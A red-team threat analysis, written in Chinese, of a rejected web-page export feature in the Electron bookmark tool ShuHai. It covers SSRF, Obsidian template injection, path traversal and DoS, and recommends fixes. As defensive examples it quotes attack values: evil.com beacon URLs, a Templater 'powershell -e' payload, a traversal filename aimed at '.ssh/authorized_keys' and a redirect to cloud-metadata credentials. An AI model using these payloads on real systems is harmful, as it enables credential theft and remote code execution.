# ShuHai 全文导出功能 — Red Team 威胁分析

> **历史威胁分析。** 其中风险判断仍可参考，但对应后台全文导出方案已否决，不得按本文继续实现。

## 攻击面概述

当 ShuHai 抓取用户书签对应的网页时，它从**不受信任的外部服务器**拉取内容到**本地特权环境**（Electron 主进程）。
这创造了一条从互联网到用户本地文件系统的数据通道。

攻击者模型：用户书签中的恶意网站（用户作为安全研究员，这是常态而非异常）。

---

## 威胁矩阵（按 OWASP Top 10 + Electron 特有风险）

### T1. SSRF — 服务端请求伪造

**当前风险等级：HIGH**

| 攻击向量      | 描述                                                                      | 当前防护                        | 绕过方式                                  |
| ------------- | ------------------------------------------------------------------------- | ------------------------------- | ----------------------------------------- |
| DNS Rebinding | 恶意域名首次解析为公网 IP（通过 SSRF 检查），TTL=0 后重新解析为 127.0.0.1 | `resolveSafeUrl()` 在请求前检查 | fetch() 独立做 DNS 解析，存在 TOCTOU 窗口 |
| 302 重定向    | 公网服务器返回 302 → http://169.254.169.254/metadata                      | 无                              | `redirect: 'follow'` 不重新验证目标       |
| IPv6 映射绕过 | `[::ffff:127.0.0.1]` 的非标准表示                                         | 部分覆盖                        | `0:0:0:0:0:ffff:7f00:1` 等变体未测试      |
| 缺失网段      | 100.64.0.0/10 (CGNAT)、198.18.0.0/15                                      | 未阻止                          | 直接访问                                  |
| URL 解析差异  | `http://127.0.0.1:80@evil.com`                                            | URL 构造函数解析                | 不同 HTTP 库解析行为不一致                |

**影响**：读取云元数据服务（AWS/GCP/Azure）、访问内网服务、端口扫描。

### T2. 远程图片加载 — 信息泄露 + 追踪

**当前风险等级：HIGH**

| 攻击向量     | 描述                                                                                                      |
| ------------ | --------------------------------------------------------------------------------------------------------- |
| 追踪像素     | `<img src="https://evil.com/track?uid=xxx">` — 当 Obsidian 渲染 .md 时加载远程图片，泄露用户 IP、访问时间 |
| SSRF via img | `<img src="http://169.254.169.254/metadata">` — 如果 Obsidian 或任何 Markdown 渲染器尝试加载              |
| 大文件 DoS   | `<img src="https://evil.com/10gb.png">` — 消耗带宽和磁盘                                                  |
| SVG XSS      | `<img src="data:image/svg+xml,...<script>...">` — SVG 中嵌入脚本                                          |
| 指纹识别     | 通过加载多个唯一 URL 的图片，追踪哪些书签被导出                                                           |

**关键问题**：即使 ShuHai 本身不加载图片，导出的 Markdown 中如果保留 `![](remote-url)`，
Obsidian 会在用户打开文件时加载这些远程资源。这等于把攻击面延伸到了 Obsidian。

### T3. 注入攻击 — 代码执行

**当前风险等级：CRITICAL**

| 攻击向量                | 目标     | 描述                                                                          |
| ----------------------- | -------- | ----------------------------------------------------------------------------- |
| Obsidian Templater 注入 | 用户本地 | `<% tp.system("calc.exe") %>` — 如果用户安装了 Templater 插件                 |
| Dataview JS 注入        | 用户本地 | ` ```dataviewjs\napp.vault.adapter.write(...)``` ` — Dataview 的 JS 执行模式  |
| Obsidian URI 注入       | 用户本地 | `[click](obsidian://advanced-uri?vault=x&commandid=...)` — 触发 Obsidian 命令 |
| Shell 命令插件注入      | 用户本地 | 通过 Obsidian 社区插件的 shell 执行能力                                       |
| YAML frontmatter 注入   | 解析器   | 构造特殊 YAML 导致解析器行为异常                                              |
| Markdown 链接逃逸       | 渲染器   | `[text](url "title" onclick="...")` — 某些渲染器不过滤                        |

### T4. 路径遍历 — 文件系统攻击

**当前风险等级：MEDIUM**

| 攻击向量       | 描述                                                         |
| -------------- | ------------------------------------------------------------ |
| 文件名注入     | 书签标题为 `../../.ssh/authorized_keys` → 导出时写入任意路径 |
| 符号链接       | vault 目录中的 symlink 指向系统目录                          |
| 长路径 DoS     | Windows MAX_PATH 限制导致异常                                |
| Unicode 规范化 | `\u002e\u002e/` 绕过 `..` 检测                               |

**当前防护**：`sanitizeFilename` + `safeCategoryPath` + `isWithinDirectory` 检查。
**绕过风险**：Unicode 规范化攻击、`....` → `..` 的正则单次替换问题。

### T5. 拒绝服务 (DoS)

**当前风险等级：MEDIUM**

| 攻击向量      | 描述                                                   |
| ------------- | ------------------------------------------------------ |
| Zip Bomb HTML | 极小的 gzip 响应解压后为 GB 级 HTML                    |
| 无限响应流    | 服务器永不关闭连接，持续发送数据                       |
| 正则 ReDoS    | 恶意构造的 HTML 触发 Readability/Turndown 中的正则回溯 |
| 递归 DOM      | 深度嵌套的 HTML 标签导致 DOM 解析栈溢出                |
| 大量书签并发  | 用户有 10000 个书签，同时抓取导致内存耗尽              |
| 磁盘填充      | 每个页面导出 1MB × 10000 = 10GB                        |

### T6. 信息泄露

**当前风险等级：MEDIUM**

| 攻击向量         | 描述                                                                 |
| ---------------- | -------------------------------------------------------------------- |
| Referer 泄露     | 抓取请求携带 Referer header 暴露来源                                 |
| Cookie/Auth 泄露 | 如果 fetch 携带 cookie（Electron 主进程的 fetch 不应该有，但需确认） |
| 本地路径泄露     | 错误信息中包含本地文件路径                                           |
| API Key 泄露     | 日志中意外记录 API Key                                               |
| 时序攻击         | 通过响应时间推断内网服务存在                                         |

### T7. 供应链攻击（新增依赖）

**当前风险等级：MEDIUM**

Goal 004 需要安装 4 个新依赖：
| 包 | 风险点 |
|---|--------|
| `@mozilla/readability` | Mozilla 官方，风险低。但要确认 npm 上的包名是否真的是 Mozilla 发布 |
| `linkedom` / `jsdom` | DOM 解析器处理恶意 HTML 时可能有未知漏洞 |
| `turndown` | HTML→MD 转换，处理恶意输入时的行为未知 |
| `turndown-plugin-gfm` | 社区维护，需确认维护者 |

### T8. Electron 特有风险

**当前风险等级：LOW-MEDIUM**

| 攻击向量                    | 描述                                       | 当前防护                    |
| --------------------------- | ------------------------------------------ | --------------------------- |
| Renderer XSS → IPC 滥用     | 如果 renderer 被 XSS，可调用所有暴露的 IPC | contextIsolation + 有限 API |
| `showItemInFolder` 任意路径 | 确认任意文件/目录存在                      | 无验证                      |
| `setConfig` 篡改            | 修改 vaultPath 到敏感目录                  | 无路径验证                  |
| Preload 原型污染            | 通过 `__proto__` 污染 contextBridge 对象   | Electron 内部防护           |

### T9. 缓存投毒

**当前风险等级：LOW**（如果实现了 Goal 004 的缓存机制则升为 MEDIUM）

| 攻击向量                 | 描述                          |
| ------------------------ | ----------------------------- |
| 首次访问正常，缓存后替换 | 攻击者在缓存期内修改页面内容  |
| 缓存 key 碰撞            | URL hash 碰撞导致错误内容     |
| 缓存膨胀                 | 大量大页面填满 500MB 缓存限制 |

---

## 按严重程度排序的修复建议

### P0 — 必须在 Goal 004 中修复

1. **图片处理策略**：不保留远程图片 URL。选项：

   - a) 下载图片到本地 vault（需大小限制 + 类型验证）
   - b) 替换为占位符 `[图片: alt-text](原始URL)` — 不自动加载
   - c) 完全移除图片
   - **推荐 b)**：保留信息但不触发加载

2. **SSRF 重定向防护**：使用 `redirect: 'manual'`，手动跟随重定向并对每个 hop 重新验证

3. **DNS Rebinding 防护**：将 `resolveSafeUrl` 解析的 IP 直接用于连接（替换 hostname 为 IP + 设置 Host header）

4. **Obsidian 可执行语法全面中和**：

   - `dataviewjs` 代码块 → 改为 `text`
   - `<% %>` Templater → 转义
   - `obsidian://` URI → 转义或移除
   - `![[embed]]` → 转义
   - `{{}}` → 转义

5. **响应体大小限制**：流式读取，超过 5MB 立即中断

6. **禁止 fetch 携带凭据**：`credentials: 'omit'`

### P1 — 应该在 Goal 004 中修复

7. **补全 SSRF 私有网段**：添加 CGNAT、benchmark、documentation 等保留地址

8. **`showItemInFolder` 路径验证**：限制为 vault 目录内的路径

9. **`setConfig` vaultPath 验证**：确认路径存在且不是系统目录

10. **SVG 消毒**：如果保留 SVG 图片，必须移除其中的 script/event handler

11. **HTML 解压炸弹防护**：限制解压后大小，或不接受 gzip 响应（`Accept-Encoding: identity`）

12. **DOM 深度限制**：在 linkedom/jsdom 解析前限制 HTML 大小

### P2 — 后续迭代修复

13. **Referer 策略**：设置 `Referrer-Policy: no-referrer`（fetch 的 `referrer: ''`）
14. **Unicode 规范化**：文件名和路径在检查前做 NFC 规范化
15. **正则 ReDoS 审计**：审计 Readability/Turndown 的正则表达式
16. **缓存签名**：缓存内容附带 hash，读取时验证完整性

---

## 攻击链示例

### 场景 1: 安全研究员导出恶意样本分析页面

```
1. 用户书签: https://malware-analysis.blog/apt-report
2. 页面包含: <img src="https://c2.evil.com/beacon?target=researcher-ip">
3. ShuHai 导出为 .md，保留 ![](https://c2.evil.com/beacon?target=researcher-ip)
4. 用户在 Obsidian 打开 → Obsidian 加载图片 → C2 服务器获得研究员 IP
5. 攻击者知道谁在分析他们的恶意软件
```

### 场景 2: Templater RCE

```
1. 用户书签: https://evil-ctf.com/writeup
2. 页面正文包含: <% tp.system("powershell -e BASE64PAYLOAD") %>
3. ShuHai 导出为 .md，如果未转义模板语法
4. 用户在 Obsidian 打开 → Templater 插件自动执行 → RCE
```

### 场景 3: SSRF 读取云凭据

```
1. 用户书签: https://attacker.com/redirect
2. ShuHai 抓取 → SSRF guard 通过（公网 IP）
3. 服务器返回 302 → http://169.254.169.254/latest/meta-data/iam/security-credentials/
4. fetch 跟随重定向 → 读取 AWS IAM 凭据
5. 凭据出现在缓存/日志中
```

### 场景 4: 磁盘填充 DoS

```
1. 用户有 5000 个书签
2. 其中 100 个指向 Content-Length: 5MB 的页面
3. 全部导出 → 500MB .md 文件 + 500MB 缓存 = 1GB 磁盘消耗
4. 加上图片下载（如果实现）→ 可能 10GB+
```
